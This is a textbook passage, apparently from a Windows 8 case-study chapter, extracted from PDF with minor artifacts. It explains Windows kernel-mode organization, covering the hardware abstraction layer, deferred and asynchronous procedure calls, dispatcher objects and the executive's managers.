            "content": "11.3.1 Operating System Structure\r\nAs described earlier, the Windows operating system consists of many layers, as\r\ndepicted in Fig. 11-4. In the following sections we will dig into the lowest levels\r\nof the operating system: those that run in kernel mode. The central layer is the\r\nNTOS kernel itself, which is loaded from ntoskrnl.exe when Windows boots.\r\nNTOS itself consists of two layers, the executive, which containing most of the\r\nservices, and a smaller layer which is (also) called the kernel and implements the\r\nunderlying thread scheduling and synchronization abstractions (a kernel within the\r\nkernel?), as well as implementing trap handlers, interrupts, and other aspects of\r\nhow the CPU is managed.\n878 CASE STUDY 2: WINDOWS 8 CHAP. 11\r\nThe division of NTOS into kernel and executive is a reflection of NT’s\r\nVAX/VMS roots. The VMS operating system, which was also designed by Cutler,\r\nhad four hardware-enforced layers: user, supervisor, executive, and kernel corres\u0002ponding to the four protection modes provided by the VAX processor architecture.\r\nThe Intel CPUs also support four rings of protection, but some of the early target\r\nprocessors for NT did not, so the kernel and executive layers represent a soft\u0002ware-enforced abstraction, and the functions that VMS provides in supervisor\r\nmode, such as printer spooling, are provided by NT as user-mode services.\r\nThe kernel-mode layers of NT are shown in Fig. 11-11. The kernel layer of\r\nNTOS is shown above the executive layer because it implements the trap and inter\u0002rupt mechanisms used to transition from user mode to kernel mode.\r\nUser mode\r\nKernel mode\r\nSystem library kernel user-mode dispatch routines (ntdll.dll)\r\nHardware abstraction layer\r\nSecurity monitor\r\nObject manager Config manager\r\nExecutive run-time library\r\nTrap/exception/interrupt dispatch\r\nCPU scheduling and synchronization: threads, ISRs, DPCs, APCs\r\nNTOS\r\nkernel\r\nlayer\r\nNTOS executive layer\r\nI/O manager\r\nVirtual memory\r\nCache manager\r\nProcs and threads\r\nLPC\r\nFile systems,\r\nvolume manager,\r\nTCP/IP stack,\r\nnet interfaces\r\ngraphics devices,\r\nall other devices\r\nHardware CPU, MMU, interrupt controllers, memory, physical devices, BIOS\r\nDrivers\r\nFigure 11-11. Windows kernel-mode organization.\r\nThe uppermost layer in Fig. 11-11 is the system library (ntdll.dll), which ac\u0002tually runs in user mode. The system library includes a number of support func\u0002tions for the compiler run-time and low-level libraries, similar to what is in libc in\r\nUNIX. ntdll.dll also contains special code entry points used by the kernel to ini\u0002tialize threads and dispatch exceptions and user-mode APCs (Asynchronous Pro\u0002cedure Calls). Because the system library is so integral to the operation of the ker\u0002nel, every user-mode process created by NTOS has ntdll mapped at the same fixed\r\naddress. When NTOS is initializing the system it creates a section object to use\r\nwhen mapping ntdll, and it also records addresses of the ntdll entry points used by\r\nthe kernel.\r\nBelow the NTOS kernel and executive layers is a layer of software called the\r\nHAL (Hardware Abstraction Layer) which abstracts low-level hardware details\r\nlike access to device registers and DMA operations, and the way the parentboard\nSEC. 11.3 SYSTEM STRUCTURE 879\r\nfirmware represents configuration information and deals with differences in the\r\nCPU support chips, such as various interrupt controllers.\r\nThe lowest software layer is the hypervisor, which Windows calls Hyper-V.\r\nThe hypervisor is an optional feature (not shown in Fig. 11-11). It is available in\r\nmany versions of Windows—including the professional desktop client. The hyper\u0002visor intercepts many of the privileged operations performed by the kernel and\r\nemulates them in a way that allows multiple operating systems to run at the same\r\ntime. Each operating system runs in its own virtual machine, which Windows calls\r\na partition. The hypervisor uses features in the hardware architecture to protect\r\nphysical memory and provide isolation between partitions. An operating system\r\nrunning on top of the hypervisor executes threads and handles interrupts on\r\nabstractions of the physical processors called virtual processors. The hypervisor\r\nschedules the virtual processors on the physical processors.\r\nThe main (root) operating system runs in the root partition. It provides many\r\nservices to the other (guest) partitions. Some of the most important services pro\u0002vide integration of the guests with the shared devices such as networking and the\r\nGUI. While the root operating system must be Windows when running Hyper-V,\r\nother operating systems, such as Linux, can be run in the guest partitions. A guest\r\noperating system may perform very poorly unless it has been modified (i.e., para\u0002virtualized) to work with the hypervisor.\r\nFor example, if a guest operating system kernel is using a spinlock to synchro\u0002nize between two virtual processors and the hypervisor reschedules the virtual\r\nprocessor holding the spinlock, the lock hold time may increase by orders of mag\u0002nitude, leaving other virtual processors running in the partition spinning for very\r\nlong periods of time. To solve this problem a guest operating system is enlight\u0002ened to spin only a short time before calling into the hypervisor to yield its physi\u0002cal processor to run another virtual processor.\r\nThe other major components of kernel mode are the device drivers. Windows\r\nuses device drivers for any kernel-mode facilities which are not part of NTOS or\r\nthe HAL. This includes file systems, network protocol stacks, and kernel exten\u0002sions like antivirus and DRM (Digital Rights Management) software, as well as\r\ndrivers for managing physical devices, interfacing to hardware buses, and so on.\r\nThe I/O and virtual memory components cooperate to load (and unload) device\r\ndrivers into kernel memory and link them to the NTOS and HAL layers. The I/O\r\nmanager provides interfaces which allow devices to be discovered, organized, and\r\noperated—including arranging to load the appropriate device driver. Much of the\r\nconfiguration information for managing devices and drivers is maintained in the\r\nSYSTEM hive of the registry. The plug-and-play subcomponent of the I/O man\u0002ager maintains information about the hardware detected within the HARDWARE\r\nhive, which is a volatile hive maintained in memory rather than on disk, as it is\r\ncompletely recreated every time the system boots.\r\nWe will now examine the various components of the operating system in a bit\r\nmore detail.\n880 CASE STUDY 2: WINDOWS 8 CHAP. 11\r\nThe Hardware Abstraction Layer\r\nOne goal of Windows is to make the system portable across hardware plat\u0002forms. Ideally, to bring up an operating system on a new type of computer system\r\nit should be possible to just recompile the operating system on the new platform.\r\nUnfortunately, it is not this simple. While many of the components in some layers\r\nof the operating system can be largely portable (because they mostly deal with in\u0002ternal data structures and abstractions that support the programming model), other\r\nlayers must deal with device registers, interrupts, DMA, and other hardware fea\u0002tures that differ significantly from machine to machine.\r\nMost of the source code for the NTOS kernel is written in C rather than assem\u0002bly language (only 2% is assembly on x86, and less than 1% on x64). However, all\r\nthis C code cannot just be scooped up from an x86 system, plopped down on, say,\r\nan ARM system, recompiled, and rebooted owing to the many hardware differ\u0002ences between processor architectures that have nothing to do with the different in\u0002struction sets and which cannot be hidden by the compiler. Languages like C make\r\nit difficult to abstract away some hardware data structures and parameters, such as\r\nthe format of page-table entries and the physical memory page sizes and word\r\nlength, without severe performance penalties. All of these, as well as a slew of\r\nhardware-specific optimizations, would have to be manually ported even though\r\nthey are not written in assembly code.\r\nHardware details about how memory is organized on large servers, or what\r\nhardware synchronization primitives are available, can also have a big impact on\r\nhigher levels of the system. For example, NT’s virtual memory manager and the\r\nkernel layer are aware of hardware details related to cache and memory locality.\r\nThroughout the system NT uses compare&swap synchronization primitives, and it\r\nwould be difficult to port to a system that does not have them. Finally, there are\r\nmany dependencies in the system on the ordering of bytes within words. On all the\r\nsystems NT has ever been ported to, the hardware was set to little-endian mode.\r\nBesides these larger issues of portability, there are also minor ones even be\u0002tween different parentboards from different manufacturers. Differences in CPU\r\nversions affect how synchronization primitives like spin-locks are implemented.\r\nThere are several families of support chips that create differences in how hardware\r\ninterrupts are prioritized, how I/O device registers are accessed, management of\r\nDMA transfers, control of the timers and real-time clock, multiprocessor synchron\u0002ization, working with firmware facilities such as ACPI (Advanced Configuration\r\nand Power Interface), and so on. Microsoft made a serious attempt to hide these\r\ntypes of machine dependencies in a thin layer at the bottom called the HAL, as\r\nmentioned earlier. The job of the HAL is to present the rest of the operating sys\u0002tem with abstract hardware that hides the specific details of processor version, sup\u0002port chipset, and other configuration variations. These HAL abstractions are pres\u0002ented in the form of machine-independent services (procedure calls and macros)\r\nthat NTOS and the drivers can use.\nSEC. 11.3 SYSTEM STRUCTURE 881\r\nBy using the HAL services and not addressing the hardware directly, drivers\r\nand the kernel require fewer changes when being ported to new processors—and in\r\nmost cases can run unmodified on systems with the same processor architecture,\r\ndespite differences in versions and support chips.\r\nThe HAL does not provide abstractions or services for specific I/O devices\r\nsuch as keyboards, mice, and disks or for the memory management unit. These\r\nfacilities are spread throughout the kernel-mode components, and without the HAL\r\nthe amount of code that would have to be modified when porting would be sub\u0002stantial, even when the actual hardware differences were small. Porting the HAL\r\nitself is straightforward because all the machine-dependent code is concentrated in\r\none place and the goals of the port are well defined: implement all of the HAL ser\u0002vices. For many releases Microsoft supported a HAL Development Kit allowing\r\nsystem manufacturers to build their own HAL, which would allow other kernel\r\ncomponents to work on new systems without modification, provided that the hard\u0002ware changes were not too great.\r\nAs an example of what the hardware abstraction layer does, consider the issue\r\nof memory-mapped I/O vs. I/O ports. Some machines have one and some have the\r\nother. How should a driver be programmed: to use memory-mapped I/O or not?\r\nRather than forcing a choice, which would make the driver not portable to a ma\u0002chine that did it the other way, the hardware abstraction layer offers three proce\u0002dures for driver writers to use for reading the device registers and another three for\r\nwriting them:\r\nuc = READ PORT UCHAR(por t); WRITE PORT UCHAR(por t, uc);\r\nus = READ PORT USHORT(por t); WRITE PORT USHORT(por t, us);\r\nul = READ PORT ULONG(por t); WRITE PORT LONG(por t, ul);\r\nThese procedures read and write unsigned 8-, 16-, and 32-bit integers, respectively,\r\nto the specified port. It is up to the hardware abstraction layer to decide whether\r\nmemory-mapped I/O is needed here. In this way, a driver can be moved without\r\nmodification between machines that differ in the way the device registers are im\u0002plemented.\r\nDrivers frequently need to access specific I/O devices for various purposes. At\r\nthe hardware level, a device has one or more addresses on a certain bus. Since\r\nmodern computers often have multiple buses (PCI, PCIe, USB, IEEE 1394, etc.), it\r\ncan happen that more than one device may have the same address on different\r\nbuses, so some way is needed to distinguish them. The HAL provides a service for\r\nidentifying devices by mapping bus-relative device addresses onto systemwide log\u0002ical addresses. In this way, drivers do not have to keep track of which device is\r\nconnected to which bus. This mechanism also shields higher layers from proper\u0002ties of alternative bus structures and addressing conventions.\r\nInterrupts have a similar problem—they are also bus dependent. Here, too, the\r\nHAL provides services to name interrupts in a systemwide way and also provides\r\nways to allow drivers to attach interrupt service routines to interrupts in a portable\n882 CASE STUDY 2: WINDOWS 8 CHAP. 11\r\nway, without having to know anything about which interrupt vector is for which\r\nbus. Interrupt request level management is also handled in the HAL.\r\nAnother HAL service is setting up and managing DMA transfers in a de\u0002vice-independent way. Both the systemwide DMA engine and DMA engines on\r\nspecific I/O cards can be handled. Devices are referred to by their logical ad\u0002dresses. The HAL implements software scatter/gather (writing or reading from\r\nnoncontiguous blocks of physical memory).\r\nThe HAL also manages clocks and timers in a portable way. Time is kept\r\ntrack of in units of 100 nanoseconds starting at midnight on 1 January 1601, which\r\nis the first date in the previous quadricentury, which simplifies leap-year computa\u0002tions. (Quick Quiz: Was 1800 a leap year? Quick Answer: No.) The time services\r\ndecouple the drivers from the actual frequencies at which the clocks run.\r\nKernel components sometimes need to synchronize at a very low lev el, espe\u0002cially to prevent race conditions in multiprocessor systems. The HAL provides\r\nprimitives to manage this synchronization, such as spin locks, in which one CPU\r\nsimply waits for a resource held by another CPU to be released, particularly in\r\nsituations where the resource is typically held only for a few machine instructions.\r\nFinally, after the system has been booted, the HAL talks to the computer’s\r\nfirmware (BIOS) and inspects the system configuration to find out which buses and\r\nI/O devices the system contains and how they hav e been configured. This infor\u0002mation is then put into the registry. A summary of some of the things the HAL\r\ndoes is given in Fig. 11-12.\r\nDevice\r\nregisters\r\nDevice\r\naddresses Interrupts DMA Timers\r\nSpin\r\nlocks Firmware\r\nDisk\r\nRAM\r\nPrinter\r\n1.\r\n2.\r\n3.\r\nMOV EAX,ABC\r\nADD EAX,BAX\r\nBNE LABEL\r\nMOV EAX,ABC\r\nMOV EAX,ABC\r\nADD EAX,BAX\r\nBNE LABEL\r\nMOVE AX,ABC\r\nADD EAX,BAX\r\nBNE LABEL\r\nHardware abstraction layer\r\nFigure 11-12. Some of the hardware functions the HAL manages.\r\nThe Kernel Layer\r\nAbove the hardware abstraction layer is NTOS, consisting of two layers: the\r\nkernel and the executive. ‘‘Kernel’’ is a confusing term in Windows. It can refer to\r\nall the code that runs in the processor’s kernel mode. It can also refer to the\nSEC. 11.3 SYSTEM STRUCTURE 883\r\nntoskrnl.exe file which contains NTOS, the core of the Windows operating system.\r\nOr it can refer to the kernel layer within NTOS, which is how we use it in this sec\u0002tion. It is even used to name the user-mode Win32 library that provides the wrap\u0002pers for the native system calls: kernel32.dll.\r\nIn the Windows operating system the kernel layer, illustrated above the execu\u0002tive layer in Fig. 11-11, provides a set of abstractions for managing the CPU. The\r\nmost central abstraction is threads, but the kernel also implements exception han\u0002dling, traps, and several kinds of interrupts. Creating and destroying the data struc\u0002tures which support threading is implemented in the executive layer. The kernel\r\nlayer is responsible for scheduling and synchronization of threads. Having support\r\nfor threads in a separate layer allows the executive layer to be implemented using\r\nthe same preemptive multithreading model used to write concurrent code in user\r\nmode, though the synchronization primitives in the executive are much more spe\u0002cialized.\r\nThe kernel’s thread scheduler is responsible for determining which thread is\r\nexecuting on each CPU in the system. Each thread executes until a timer interrupt\r\nsignals that it is time to switch to another thread (quantum expired), or until the\r\nthread needs to wait for something to happen, such as an I/O to complete or for a\r\nlock to be released, or a higher-priority thread becomes runnable and needs the\r\nCPU. When switching from one thread to another, the scheduler runs on the CPU\r\nand ensures that the registers and other hardware state have been saved. The\r\nscheduler then selects another thread to run on the CPU and restores the state that\r\nwas previously saved from the last time that thread ran.\r\nIf the next thread to be run is in a different address space (i.e., process) than\r\nthe thread being switched from, the scheduler must also change address spaces.\r\nThe details of the scheduling algorithm itself will be discussed later in this chapter\r\nwhen we come to processes and threads.\r\nIn addition to providing a higher-level abstraction of the hardware and han\u0002dling thread switches, the kernel layer also has another key function: providing\r\nlow-level support for two classes of synchronization mechanisms: control objects\r\nand dispatcher objects. Control objects are the data structures that the kernel\r\nlayer provides as abstractions to the executive layer for managing the CPU. They\r\nare allocated by the executive but they are manipulated with routines provided by\r\nthe kernel layer. Dispatcher objects are the class of ordinary executive objects\r\nthat use a common data structure for synchronization.\r\nDeferred Procedure Calls\r\nControl objects include primitive objects for threads, interrupts, timers, syn\u0002chronization, profiling, and two special objects for implementing DPCs and APCs.\r\nDPC (Deferred Procedure Call) objects are used to reduce the time taken to ex\u0002ecute ISRs (Interrupt Service Routines) in response to an interrupt from a partic\u0002ular device. Limiting time spent in ISRs reduces the chance of losing an interrupt.\n884 CASE STUDY 2: WINDOWS 8 CHAP. 11\r\nThe system hardware assigns a hardware priority level to interrupts. The CPU\r\nalso associates a priority level with the work it is performing. The CPU responds\r\nonly to interrupts at a higher-priority level than it is currently using. Normal prior\u0002ity levels, including the priority level of all user-mode work, is 0. Device inter\u0002rupts occur at priority 3 or higher, and the ISR for a device interrupt normally ex\u0002ecutes at the same priority level as the interrupt in order to keep other less impor\u0002tant interrupts from occurring while it is processing a more important one.\r\nIf an ISR executes too long, the servicing of lower-priority interrupts will be\r\ndelayed, perhaps causing data to be lost or slowing the I/O throughput of the sys\u0002tem. Multiple ISRs can be in progress at any one time, with each successive ISR\r\nbeing due to interrupts at higher and higher-priority levels.\r\nTo reduce the time spent processing ISRs, only the critical operations are per\u0002formed, such as capturing the result of an I/O operation and reinitializing the de\u0002vice. Further processing of the interrupt is deferred until the CPU priority level is\r\nlowered and no longer blocking the servicing of other interrupts. The DPC object\r\nis used to represent the further work to be done and the ISR calls the kernel layer\r\nto queue the DPC to the list of DPCs for a particular processor. If the DPC is the\r\nfirst on the list, the kernel registers a special request with the hardware to interrupt\r\nthe CPU at priority 2 (which NT calls DISPATCH level). When the last of any ex\u0002ecuting ISRs completes, the interrupt level of the processor will drop back below 2,\r\nand that will unblock the interrupt for DPC processing. The ISR for the DPC inter\u0002rupt will process each of the DPC objects that the kernel had queued.\r\nThe technique of using software interrupts to defer interrupt processing is a\r\nwell-established method of reducing ISR latency. UNIX and other systems started\r\nusing deferred processing in the 1970s to deal with the slow hardware and limited\r\nbuffering of serial connections to terminals. The ISR would deal with fetching\r\ncharacters from the hardware and queuing them. After all higher-level interrupt\r\nprocessing was completed, a software interrupt would run a low-priority ISR to do\r\ncharacter processing, such as implementing backspace by sending control charac\u0002ters to the terminal to erase the last character displayed and move the cursor back\u0002ward.\r\nA similar example in Windows today is the keyboard device. After a key is\r\nstruck, the keyboard ISR reads the key code from a register and then reenables the\r\nkeyboard interrupt but does not do further processing of the key immediately. In\u0002stead, it uses a DPC to queue the processing of the key code until all outstanding\r\ndevice interrupts have been processed.\r\nBecause DPCs run at level 2 they do not keep device ISRs from executing, but\r\nthey do prevent any threads from running until all the queued DPCs complete and\r\nthe CPU priority level is lowered below 2. Device drivers and the system itself\r\nmust take care not to run either ISRs or DPCs for too long. Because threads are\r\nnot allowed to execute, ISRs and DPCs can make the system appear sluggish and\r\nproduce glitches when playing music by stalling the threads writing the music\r\nbuffer to the sound device. Another common use of DPCs is running routines in\nSEC. 11.3 SYSTEM STRUCTURE 885\r\nresponse to a timer interrupt. To avoid blocking threads, timer events which need\r\nto run for an extended time should queue requests to the pool of worker threads the\r\nkernel maintains for background activities.\r\nAsynchronous Procedure Calls\r\nThe other special kernel control object is the APC (Asynchronous Procedure\r\nCall) object. APCs are like DPCs in that they defer processing of a system rou\u0002tine, but unlike DPCs, which operate in the context of particular CPUs, APCs ex\u0002ecute in the context of a specific thread. When processing a key press, it does not\r\nmatter which context the DPC runs in because a DPC is simply another part of in\u0002terrupt processing, and interrupts only need to manage the physical device and per\u0002form thread-independent operations such as recording the data in a buffer in kernel\r\nspace.\r\nThe DPC routine runs in the context of whatever thread happened to be run\u0002ning when the original interrupt occurred. It calls into the I/O system to report that\r\nthe I/O operation has been completed, and the I/O system queues an APC to run in\r\nthe context of the thread making the original I/O request, where it can access the\r\nuser-mode address space of the thread that will process the input.\r\nAt the next convenient time the kernel layer delivers the APC to the thread and\r\nschedules the thread to run. An APC is designed to look like an unexpected proce\u0002dure call, somewhat similar to signal handlers in UNIX. The kernel-mode APC for\r\ncompleting I/O executes in the context of the thread that initiated the I/O, but in\r\nkernel mode. This gives the APC access to both the kernel-mode buffer as well as\r\nall of the user-mode address space belonging to the process containing the thread.\r\nWhen an APC is delivered depends on what the thread is already doing, and even\r\nwhat type of system. In a multiprocessor system the thread receiving the APC may\r\nbegin executing even before the DPC finishes running.\r\nUser-mode APCs can also be used to deliver notification of I/O completion in\r\nuser mode to the thread that initiated the I/O. User-mode APCs invoke a user\u0002mode procedure designated by the application, but only when the target thread has\r\nblocked in the kernel and is marked as willing to accept APCs. The kernel inter\u0002rupts the thread from waiting and returns to user mode, but with the user-mode\r\nstack and registers modified to run the APC dispatch routine in the ntdll.dll system\r\nlibrary. The APC dispatch routine invokes the user-mode routine that the applica\u0002tion has associated with the I/O operation. Besides specifying user-mode APCs as\r\na means of executing code when I/Os complete, the Win32 API QueueUserAPC\r\nallows APCs to be used for arbitrary purposes.\r\nThe executive layer also uses APCs for operations other than I/O completion.\r\nBecause the APC mechanism is carefully designed to deliver APCs only when it is\r\nsafe to do so, it can be used to safely terminate threads. If it is not a good time to\r\nterminate the thread, the thread will have declared that it was entering a critical re\u0002gion and defer deliveries of APCs until it leaves. Kernel threads mark themselves\n886 CASE STUDY 2: WINDOWS 8 CHAP. 11\r\nas entering critical regions to defer APCs when acquiring locks or other resources,\r\nso that they cannot be terminated while still holding the resource.\r\nDispatcher Objects\r\nAnother kind of synchronization object is the dispatcher object. This is any\r\nordinary kernel-mode object (the kind that users can refer to with handles) that\r\ncontains a data structure called a dispatcher header, shown in Fig. 11-13. These\r\nobjects include semaphores, mutexes, events, waitable timers, and other objects\r\nthat threads can wait on to synchronize execution with other threads. They also in\u0002clude objects representing open files, processes, threads, and IPC ports. The dis\u0002patcher data structure contains a flag representing the signaled state of the object,\r\nand a queue of threads waiting for the object to be signaled.\r\nNotification/Synchronization flag\r\nSignaled state\r\nList head for waiting threads\r\nObject-specific data\r\nObject header\r\nExecutive\r\nobject DISPATCHER_HEADER\r\nFigure 11-13. dispatcher header data structure embedded in many executive ob\u0002jects (dispatcher objects).\r\nSynchronization primitives, like semaphores, are natural dispatcher objects.\r\nAlso timers, files, ports, threads, and processes use the dispatcher-object mechan\u0002isms for notifications. When a timer fires, I/O completes on a file, data are avail\u0002able on a port, or a thread or process terminates, the associated dispatcher object is\r\nsignaled, waking all threads waiting for that event.\r\nSince Windows uses a single unified mechanism for synchronization with ker\u0002nel-mode objects, specialized APIs, such as wait3, for waiting for child processes\r\nin UNIX, are not needed to wait for events. Often threads want to wait for multiple\r\nev ents at once. In UNIX a process can wait for data to be available on any of 64\r\nnetwork sockets using the select system call. In Windows, there is a similar API\r\nWaitForMultipleObjects, but it allows for a thread to wait on any type of dis\u0002patcher object for which it has a handle. Up to 64 handles can be specified to Wait\u0002ForMultipleObjects, as well as an optional timeout value. The thread becomes\r\nready to run whenever any of the events associated with the handles is signaled or\r\nthe timeout occurs.\r\nThere are actually two different procedures the kernel uses for making the\r\nthreads waiting on a dispatcher object runnable. Signaling a notification object\r\nwill make every waiting thread runnable. Synchronization objects make only the\r\nfirst waiting thread runnable and are used for dispatcher objects that implement\nSEC. 11.3 SYSTEM STRUCTURE 887\r\nlocking primitives, like mutexes. When a thread that is waiting for a lock begins\r\nrunning again, the first thing it does is to retry acquiring the lock. If only one\r\nthread can hold the lock at a time, all the other threads made runnable might im\u0002mediately block, incurring lots of unnecessary context switching. The difference\r\nbetween dispatcher objects using synchronization vs. notification is a flag in the\r\ndispatcher header structure.\r\nAs a little aside, mutexes in Windows are called ‘‘mutants’’ in the code be\u0002cause they were required to implement the OS/2 semantics of not automatically\r\nunlocking themselves when a thread holding one exited, something Cutler consid\u0002ered bizarre.\r\nThe Executive Layer\r\nAs shown in Fig. 11-11, below the kernel layer of NTOS there is the executive.\r\nThe executive layer is written in C, is mostly architecture independent (the memo\u0002ry manager being a notable exception), and has been ported with only modest\r\neffort to new processors (MIPS, x86, PowerPC, Alpha, IA64, x64, and ARM). The\r\nexecutive contains a number of different components, all of which run using the\r\ncontrol abstractions provided by the kernel layer.\r\nEach component is divided into internal and external data structures and inter\u0002faces. The internal aspects of each component are hidden and used only within the\r\ncomponent itself, while the external aspects are available to all the other compo\u0002nents within the executive. A subset of the external interfaces are exported from\r\nthe ntoskrnl.exe executable and device drivers can link to them as if the executive\r\nwere a library. Microsoft calls many of the executive components ‘‘managers,’’ be\u0002cause each is charge of managing some aspect of the operating services, such as\r\nI/O, memory, processes, objects, etc.\r\nAs with most operating systems, much of the functionality in the Windows ex\u0002ecutive is like library code, except that it runs in kernel mode so its data structures\r\ncan be shared and protected from access by user-mode code, and so it can access\r\nkernel-mode state, such as the MMU control registers. But otherwise the executive\r\nis simply executing operating system functions on behalf of its caller, and thus runs\r\nin the thread of its called.\r\nWhen any of the executive functions block waiting to synchronize with other\r\nthreads, the user-mode thread is blocked, too. This makes sense when working on\r\nbehalf of a particular user-mode thread, but it can be unfair when doing work relat\u0002ed to common housekeeping tasks. To avoid hijacking the current thread when the\r\nexecutive determines that some housekeeping is needed, a number of kernel-mode\r\nthreads are created when the system boots and dedicated to specific tasks, such as\r\nmaking sure that modified pages get written to disk.\r\nFor predictable, low-frequency tasks, there is a thread that runs once a second\r\nand has a laundry list of items to handle. For less predictable work there is the\n888 CASE STUDY 2: WINDOWS 8 CHAP. 11\r\npool of high-priority worker threads mentioned earlier which can be used to run\r\nbounded tasks by queuing a request and signaling the synchronization event that\r\nthe worker threads are waiting on.\r\nThe object manager manages most of the interesting kernel-mode objects\r\nused in the executive layer. These include processes, threads, files, semaphores,\r\nI/O devices and drivers, timers, and many others. As described previously, kernel\u0002mode objects are really just data structures allocated and used by the kernel. In\r\nWindows, kernel data structures have enough in common that it is very useful to\r\nmanage many of them in a unified facility.\r\nThe facilities provided by the object manager include managing the allocation\r\nand freeing of memory for objects, quota accounting, supporting access to objects\r\nusing handles, maintaining reference counts for kernel-mode pointer references as\r\nwell as handle references, giving objects names in the NT namespace, and provid\u0002ing an extensible mechanism for managing the lifecycle for each object. Kernel\r\ndata structures which need some of these facilities are managed by the object man\u0002ager.\r\nObject-manager objects each have a type which is used to specify exactly how\r\nthe lifecycle of objects of that type is to be managed. These are not types in the\r\nobject-oriented sense, but are simply a collection of parameters specified when the\r\nobject type is created. To create a new type, an executive component calls an ob\u0002ject-manager API to create a new type. Objects are so central to the functioning of\r\nWindows that the object manager will be discussed in more detail in the next sec\u0002tion.\r\nThe I/O manager provides the framework for implementing I/O device drivers\r\nand provides a number of executive services specific to configuring, accessing, and\r\nperforming operations on devices. In Windows, device drivers not only manage\r\nphysical devices but they also provide extensibility to the operating system. Many\r\nfunctions that are compiled into the kernel on other systems are dynamically load\u0002ed and linked by the kernel on Windows, including network protocol stacks and\r\nfile systems.\r\nRecent versions of Windows have a lot more support for running device drivers\r\nin user mode, and this is the preferred model for new device drivers. There are\r\nhundreds of thousands of different device drivers for Windows working with more\r\nthan a million distinct devices. This represents a lot of code to get correct. It is\r\nmuch better if bugs cause a device to become inaccessible by crashing in a user\u0002mode process rather than causing the system to crash. Bugs in kernel-mode device\r\ndrivers are the major source of the dreaded BSOD (Blue Screen Of Death) where\r\nWindows detects a fatal error within kernel mode and shuts down or reboots the\r\nsystem. BSOD’s are comparable to kernel panics on UNIX systems.\r\nIn essence, Microsoft has now off icially recognized what researchers in the\r\narea of microkernels such as MINIX 3 and L4 have known for years: the more\r\ncode there is in the kernel, the more bugs there are in the kernel. Since device driv\u0002ers make up something in the vicinity of 70% of the code in the kernel, the more\nSEC. 11.3 SYSTEM STRUCTURE 889\r\ndrivers that can be moved into user-mode processes, where a bug will only trigger\r\nthe failure of a single driver (rather than bringing down the entire system), the bet\u0002ter. The trend of moving code from the kernel to user-mode processes is expected\r\nto accelerate in the coming years.\r\nThe I/O manager also includes the plug-and-play and device power-man\u0002agement facilities. Plug-and-play comes into action when new devices are detect\u0002ed on the system. The plug-and-play subcomponent is first notified. It works with\r\na service, the user-mode plug-and-play manager, to find the appropriate device\r\ndriver and load it into the system. Getting the right one is not always easy and\r\nsometimes depends on sophisticated matching of the specific hardware device ver\u0002sion to a particular version of the drivers. Sometimes a single device supports a\r\nstandard interface which is supported by multiple different drivers, written by dif\u0002ferent companies.\r\nWe will study I/O further in Sec. 11.7 and the most important NT file system,\r\nNTFS, in Sec. 11.8.\r\nDevice power management reduces power consumption when possible, ex\u0002tending battery life on notebooks, and saving energy on desktops and servers. Get\u0002ting power management correct can be challenging, as there are many subtle\r\ndependencies between devices and the buses that connect them to the CPU and\r\nmemory. Power consumption is not affected just by what devices are powered-on,\r\nbut also by the clock rate of the CPU, which is also controlled by the device power\r\nmanager. We will take a more in depth look at power management in Sec. 11.9.\r\nThe process manager manages the creation and termination of processes and\r\nthreads, including establishing the policies and parameters which govern them.\r\nBut the operational aspects of threads are determined by the kernel layer, which\r\ncontrols scheduling and synchronization of threads, as well as their interaction\r\nwith the control objects, like APCs. Processes contain threads, an address space,\r\nand a handle table containing the handles the process can use to refer to kernel\u0002mode objects. Processes also include information needed by the scheduler for\r\nswitching between address spaces and managing process-specific hardware infor\u0002mation (such as segment descriptors). We will study process and thread man\u0002agement in Sec. 11.4.\r\nThe executive memory manager implements the demand-paged virtual mem\u0002ory architecture. It manages the mapping of virtual pages onto physical page\r\nframes, the management of the available physical frames, and management of the\r\npagefile on disk used to back private instances of virtual pages that are no longer\r\nloaded in memory. The memory manager also provides special facilities for large\r\nserver applications such as databases and programming language run-time compo\u0002nents such as garbage collectors. We will study memory management later in this\r\nchapter, in Sec. 11.5.\r\nThe cache manager optimizes the performance of I/O to the file system by\r\nmaintaining a cache of file-system pages in the kernel virtual address space. The\r\ncache manager uses virtually addressed caching, that is, organizing cached pages\n890 CASE STUDY 2: WINDOWS 8 CHAP. 11\r\nin terms of their location in their files. This differs from physical block caching, as\r\nin UNIX, where the system maintains a cache of the physically addressed blocks of\r\nthe raw disk volume.\r\nCache management is implemented using mapped files. The actual caching is\r\nperformed by the memory manager. The cache manager need be concerned only\r\nwith deciding what parts of what files to cache, ensuring that cached data is\r\nflushed to disk in a timely fashion, and managing the kernel virtual addresses used\r\nto map the cached file pages. If a page needed for I/O to a file is not available in\r\nthe cache, the page will be faulted in using the memory manager. We will study\r\nthe cache manager in Sec. 11.6.\r\nThe security reference monitor enforces Windows’ elaborate security mech\u0002anisms, which support the international standards for computer security called\r\nCommon Criteria, an evolution of United States Department of Defense Orange\r\nBook security requirements. These standards specify a large number of rules that a\r\nconforming system must meet, such as authenticated login, auditing, zeroing of al\u0002located memory, and many more. One rules requires that all access checks be im\u0002plemented by a single module within the system. In Windows, this module is the\r\nsecurity reference monitor in the kernel. We will study the security system in more\r\ndetail in Sec. 11.10.\r\nThe executive contains a number of other components that we will briefly de\u0002scribe. The configuration manager is the executive component which imple\u0002ments the registry, as described earlier. The registry contains configuration data for\r\nthe system in file-system files called hives. The most critical hive is the SYSTEM\r\nhive which is loaded into memory at boot time. Only after the executive layer has\r\nsuccessfully initialized its key components, including the I/O drivers that talk to\r\nthe system disk, is the in-memory copy of the hive reassociated with the copy in\r\nthe file system. Thus, if something bad happens while trying to boot the system,\r\nthe on-disk copy is much less likely to be corrupted.\r\nThe LPC component provides for a highly efficient interprocess communica\u0002tion used between processes running on the same system. It is one of the data tran\u0002sports used by the standards-based remote procedure call facility to implement the\r\nclient/server style of computing. RPC also uses named pipes and TCP/IP as tran\u0002sports.\r\nLPC was substantially enhanced in Windows 8 (it is now called ALPC, for\r\nAdvanced LPC) to provide support for new features in RPC, including RPC from\r\nkernel mode components, like drivers. LPC was a critical component in the origi\u0002nal design of NT because it is used by the subsystem layer to implement communi\u0002cation between library stub routines that run in each process and the subsystem\r\nprocess which implements the facilities common to a particular operating system\r\npersonality, such as Win32 or POSIX.\r\nWindows 8 implemented a publish/subscibe service called WNF (Windows\r\nNotification Facility). WNF notifications are based on changes to an instance of\r\nWNF state data. A publisher declares an instance of state data (up to 4 KB) and\nSEC. 11.3 SYSTEM STRUCTURE 891\r\ntells the operating system how long to maintain it (e.g., until the next reboot or\r\npermanently). A publisher atomically updates the state as appropriate. Subscri\u0002bers can arrange to run code whenever an instance of state data is modified by a\r\npublisher. Because the WNF state instances contain a fixed amount of 